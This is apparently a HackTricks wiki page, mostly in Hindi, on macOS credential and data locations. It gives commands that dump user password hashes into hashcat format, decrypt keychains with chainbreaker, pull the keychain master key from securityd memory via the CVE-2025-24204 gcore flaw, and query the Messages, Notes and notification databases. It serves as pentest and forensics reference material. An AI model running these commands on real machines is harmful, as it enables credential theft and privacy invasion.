# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## पासवर्ड

### Shadow Passwords

Shadow password यूज़र की configuration के साथ **`/var/db/dslocal/nodes/Default/users/`** में स्थित plists में stored होता है।\
निम्न oneliner का उपयोग **users के बारे में सारी जानकारी** (hash info सहित) dump करने के लिए किया जा सकता है:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**ऐसी स्क्रिप्टें**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**यह वाली**](https://github.com/octomagon/davegrohl.git) hash को **hashcat** **format** में बदलने के लिए इस्तेमाल की जा सकती हैं।

एक वैकल्पिक one-liner जो सभी non-service accounts के creds को hashcat format `-m 7100` (macOS PBKDF2-SHA512) में dump करेगा:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Another way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

यह फ़ाइल **केवल तब उपयोग की जाती है** जब system id **single-user mode** में चल रहा हो (इसलिए बहुत अक्सर नहीं)।

### Keychain Dump

ध्यान दें कि जब passwords को decrypted **dump** करने के लिए security binary का उपयोग किया जाता है, तो कई prompts user से इस operation की अनुमति देने के लिए पूछेंगे।
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
आधुनिक macOS पर सबसे दिलचस्प backing stores आमतौर पर **`~/Library/Keychains/login.keychain-db`** और **`/Library/Keychains/System.keychain`** होते हैं। ये SQLite-backed files हैं, लेकिन plaintext access अभी भी **`securityd`** द्वारा brokered होता है: raw DB चुराने से आपको मुख्यतः metadata और encrypted blobs मिलते हैं, जब तक कि आप user का password, `SystemKey`, या in-memory master key भी recover न कर लें।

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Keychaindump Overview

**keychaindump** नाम का एक tool macOS keychains से passwords extract करने के लिए विकसित किया गया है, लेकिन Big Sur जैसे newer macOS versions पर इसकी सीमाएँ हैं, जैसा कि एक [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) में बताया गया है। **keychaindump** का उपयोग करने के लिए attacker को access प्राप्त करना और privileges को **root** तक escalate करना पड़ता है। यह tool इस तथ्य का exploit करता है कि convenience के लिए login के समय keychain default रूप से unlocked हो जाती है, जिससे applications user का password बार-बार माँगे बिना उसे access कर सकती हैं। हालांकि, यदि कोई user हर use के बाद अपनी keychain को lock करने का विकल्प चुनता है, तो **keychaindump** ineffective हो जाता है।

**Keychaindump** **securityd** नाम के एक specific process को target करके काम करता है, जिसे Apple authorization और cryptographic operations के लिए daemon बताता है, जो keychain access के लिए crucial है। extraction process में user के login password से derived एक **Master Key** की पहचान शामिल है। यह key keychain file पढ़ने के लिए आवश्यक है। **Master Key** locate करने के लिए, **keychaindump** `vmmap` command का उपयोग करके **securityd** के memory heap को scan करता है, और `MALLOC_TINY` के रूप में flagged areas के भीतर संभावित keys खोजता है। इन memory locations की जांच करने के लिए निम्न command का उपयोग किया जाता है:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
संभावित master keys की पहचान करने के बाद, **keychaindump** एक specific pattern (`0x0000000000000018`) के लिए heaps में search करता है, जो master key के लिए candidate को indicate करता है। इस key का उपयोग करने के लिए deobfuscation सहित आगे के steps की आवश्यकता होती है, जैसा कि **keychaindump** के source code में outlined है। इस area पर focus करने वाले analysts को ध्यान देना चाहिए कि keychain को decrypt करने के लिए crucial data **securityd** process की memory में stored होता है। **keychaindump** को run करने के लिए एक example command है:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) का उपयोग एक OSX keychain से निम्न प्रकार की जानकारी को forensically sound तरीके से निकालने के लिए किया जा सकता है:

- Hashed Keychain password, जो [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) के साथ cracking के लिए उपयुक्त है
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) से प्राप्त master key, या SystemKey जैसा unlock file होने पर, Chainbreaker plaintext passwords भी प्रदान करेगा।

Keychain को unlock करने के इन तरीकों में से किसी एक के बिना, Chainbreaker उपलब्ध अन्य सभी जानकारी प्रदर्शित करेगा।

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey के साथ keychain keys (passwords सहित) dump करें**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **keychain keys (with passwords) cracking the hash डंप करें**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **मेमोरी डंप के साथ keychain keys (पासवर्ड सहित) डंप करें**

**मेमोरी डंप** करने के लिए [इन चरणों का पालन करें](../index.html#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **यूज़र पासवर्ड का उपयोग करके keychain keys (पासवर्ड सहित) डंप करें**

अगर आपको यूज़र का पासवर्ड पता है, तो आप इसका उपयोग करके **उस यूज़र की keychains को डंप और decrypt** कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement के जरिए Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia) ने `/usr/bin/gcore` को **`com.apple.system-task-ports.read`** entitlement के साथ ship किया, इसलिए कोई भी local admin (या malicious signed app) **SIP/TCC enforced होने पर भी किसी भी process memory को dump कर सकता था**। `securityd` को dump करने से **Keychain master key** clear में leak होती है और आप user password के बिना `login.keychain-db` decrypt कर सकते हैं।

**Vulnerable builds (15.0–15.2) पर quick repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Chainbreaker (`--key <hex>`) को दिए गए extracted hex key को feed करें ताकि login keychain decrypt हो सके। Apple ने **macOS 15.3+** में entitlement हटा दिया है, इसलिए यह केवल unpatched Sequoia builds या उन systems पर काम करता है जिन्होंने vulnerable binary को बनाए रखा है।

### kcpassword

**kcpassword** file एक file है जो **user’s login password** को रखती है, लेकिन केवल तब जब system owner ने **automatic login** enable किया हो। इसलिए, user को password मांगे बिना automatically log in कर दिया जाएगा (जो बहुत secure नहीं है)।

Password को **`/etc/kcpassword`** file में key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** के साथ xored करके store किया जाता है। अगर user का password key से लंबा है, तो key को फिर से reuse किया जाएगा।\
इससे password को recover करना काफी आसान हो जाता है, उदाहरण के लिए [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d) जैसी scripts का उपयोग करके।

## डेटाबेस में दिलचस्प जानकारी

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

**Sequoia** से पहले, आप आमतौर पर Notification Center store को **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** में पा सकते हैं। **Sequoia+** में Apple ने इसे TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** में स्थानांतरित कर दिया।

ज़्यादातर दिलचस्प जानकारी **blob** columns के अंदर store होती है, इसलिए आपको उस content को extract करके उसे human readable format में बदलना होगा (`plutil -p -`, `strings`, या एक छोटा parser). Quick triage examples:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### हाल की गोपनीयता समस्याएँ (NotificationCenter DB)

- macOS **14.7–15.1** में Apple ने banner content को `db2/db` SQLite में उचित redaction के बिना स्टोर किया। CVEs **CVE-2024-44292/44293/40838/54504** ने किसी भी local user को सिर्फ DB खोलकर दूसरे users का notification text पढ़ने दिया (कोई TCC prompt नहीं)।
- Apple ने इसे DB को `group.com.apple.usernoted` में move करके और नए Sequoia builds पर TCC से protect करके mitigate किया, इसलिए current systems पर आमतौर पर इसे पढ़ने के लिए सही user context या TCC bypass चाहिए।
- legacy endpoints पर, artefacts को preserve करना हो तो update या reboot से पहले `db`, `db-wal`, और `db-shm` files को साथ में copy करें।

### Notes

users **notes** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में मिल सकते हैं
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
यदि ऊपर दिया गया one-liner बहुत noisy है, तो `ZICNOTEDATA.ZDATA` को export करें, उसे gunzip करें, और protobuf को parse करें: यह आमतौर पर SQLite पर सीधे `strings` चलाने से ज़्यादा reliable होता है।

### Background Tasks / Login Items

**Ventura** के बाद से, user-approved login items और कई background tasks **BTM** stores में tracked होते हैं, जैसे **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** और versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**।

ये files जल्दी से persistence, helper tools, और कुछ MDM-managed background items की पहचान करने के लिए useful हैं:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
परसिस्टेंस एंगल और BTM internals के लिए, [auto-start locations page](../../macos-auto-start-locations.md#login-items) और [Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management) देखें।

## Preferences

macOS apps में preferences **`$HOME/Library/Preferences`** में होती हैं और iOS में वे `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` में होती हैं।

macOS में cli tool **`defaults`** का उपयोग **Preferences file को modify** करने के लिए किया जा सकता है।

**`/usr/sbin/cfprefsd`** XPC services `com.apple.cfprefsd.daemon` और `com.apple.cfprefsd.agent` को claim करता है और इसे preferences modify करने जैसी actions perform करने के लिए call किया जा सकता है।

## OpenDirectory permissions.plist

फाइल `/System/Library/OpenDirectory/permissions.plist` में node attributes पर applied permissions होती हैं और यह SIP द्वारा protected है।\
यह file specific users को UUID (और uid नहीं) द्वारा permissions देती है ताकि वे specific sensitive information जैसे `ShadowHashData`, `HeimdalSRPKey` और `KerberosKeys` आदि तक access कर सकें:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Notifications के लिए main daemon **`/usr/sbin/notifyd`** है। Notifications प्राप्त करने के लिए, clients को `com.apple.system.notification_center` Mach port के through register करना होता है (इन्हें `sudo lsmp -p <pid notifyd>` से check करें)। Daemon को `/etc/notify.conf` file से configure किया जा सकता है।

Notifications के लिए इस्तेमाल होने वाले names unique reverse DNS notations होते हैं, और जब किसी एक पर notification भेजी जाती है, तो वे client(s) जिन्होंने बताया है कि वे इसे handle कर सकते हैं, notification receive करेंगे।

Current status को dump करना (और सभी names देखना) संभव है, notifyd process को SIGUSR2 signal भेजकर और generated file पढ़कर: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** जिसका मुख्य binary **`/usr/sbin/distnoted`** है, notifications भेजने का एक और तरीका है। यह कुछ XPC services expose करता है और clients को verify करने की कोशिश के लिए कुछ checks करता है।

### Apple Push Notifications (APN)

इस case में, applications **topics** के लिए register कर सकती हैं। client, **`apsd`** के through Apple के servers से contact करके एक token generate करेगा।\
फिर providers भी एक token generate करेंगे और Apple के servers से connect होकर clients को messages भेज सकेंगे। ये messages locally **`apsd`** द्वारा receive किए जाएंगे, जो notification को उस application तक relay करेगा जो उसका इंतज़ार कर रही है।

Preferences `/Library/Preferences/com.apple.apsd.plist` में स्थित हैं।

macOS में messages का एक local database `/Library/Application\ Support/ApplePushService/aps.db` में और iOS में `/var/mobile/Library/ApplePushService` में स्थित है। इसमें 3 tables हैं: `incoming_messages`, `outgoing_messages` और `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
डेमन और कनेक्शनों के बारे में जानकारी प्राप्त करना भी संभव है, इसका उपयोग करके:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

ये notifications हैं जिन्हें user को screen पर देखना चाहिए:

- **`CFUserNotification`**: ये API screen पर एक pop-up with a message दिखाने का तरीका देती हैं।
- **The Bulletin Board**: यह iOS में एक banner दिखाता है जो disappear हो जाता है और Notification Center में stored रहेगा।
- **`NSUserNotificationCenter`**: यह MacOS में iOS bulletin board है। पुराने macOS releases पर database आमतौर पर `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` में रहता है; Sequoia+ पर इसे `~/Library/Group Containers/group.com.apple.usernoted/db2/db` में move किया गया था।

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
